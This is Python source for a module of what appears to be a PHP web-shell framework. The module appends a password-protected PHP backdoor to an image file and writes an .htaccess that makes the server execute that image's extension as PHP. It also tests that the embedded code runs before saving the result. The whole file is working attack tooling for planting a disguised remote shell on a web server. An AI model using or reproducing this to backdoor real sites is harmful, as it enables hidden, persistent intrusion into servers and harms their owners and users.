
from core.parameters import ParametersList, Parameter as P
from core.module import Module, ModuleException
from core.backdoor import Backdoor
from os import path, mkdir, unlink
from commands import getoutput


classname = 'Img'

class Img(Module):

    htaccess_template = '''AddType application/x-httpd-php .%s
'''


    params = ParametersList('Backdoor existing image and create htaccess (needs remote AllowOverride)', [],
                        P(arg='lpath', help='Input image path', required=True, pos=0),
                        P(arg='outdir', help='Folder to save modified image and .htaccess', default='generated-img', pos=1))



    def __init__( self, modhandler , url, password):
        """ Avoid to load default interpreter """
        self.backdoor = Backdoor(password)
        self.modhandler = modhandler
        self.modhandler.interpreter = True
        
        self.password = password
        self.name = self.__module__[8:]


    def run_module( self, input_img, output_dir ):

        if not path.exists(input_img):
            raise ModuleException(self.name, "Image '%s' not found" % input_img)
        
        if not '.' in input_img:
            raise ModuleException(self.name, "Can't find '%s' extension" % input_img)
        
        input_img_ext = input_img.split('.').pop()
        
        if not path.exists(input_img):
            raise ModuleException(self.name, "Image '%s' not found" % input_img)
        
        if not path.exists(output_dir):
            mkdir(output_dir)
        
        output_img_name = input_img.split('/').pop()
        output_img = '%s/%s' % (output_dir, output_img_name)
        output_img_test = '%s/test_%s' % (output_dir, output_img_name)
        output_htaccess = '%s/.htaccess' % output_dir
        
        try:
            input_img_data = file( input_img, 'r' ).read()
        except Exception, e:
            raise ModuleException(self.name, str(e))
            
        try:
            out = file( output_img_test, 'w' )
            out.write( '%s<?php print(str_replace("#","","T#E#S#T# #O#K#"));  ?>' % input_img_data)
            out.close()
        except Exception, e:
            raise ModuleException(self.name, str(e))
        
        test_output = getoutput('php %s' % output_img_test)
        unlink(output_img_test)
        
        if 'TEST OK' in test_output:

            try:
                out = file( output_img, 'w' )
                out.write( '%s%s' % (input_img_data, str(self.backdoor).replace('\n',' ')))
                out.close()
            except Exception, e:
                raise ModuleException(self.name, str(e))

        else:
            
            raise ModuleException(self.name, '[%s] Error testing backdoor in image \'%s\'. Choose simpler image as an empty gif file' % (self.name, output_img_test))
            
        try:
            hout = file( output_htaccess, 'wt' )
            hout.write( self.htaccess_template % input_img_ext )
            hout.close()
        except Exception, e:
            raise ModuleException(self.name, str(e))
        
        self.mprint("[%s] Backdoor file '%s' and '%s' created with password '%s'." % ( self.name, output_img, output_htaccess, self.password ))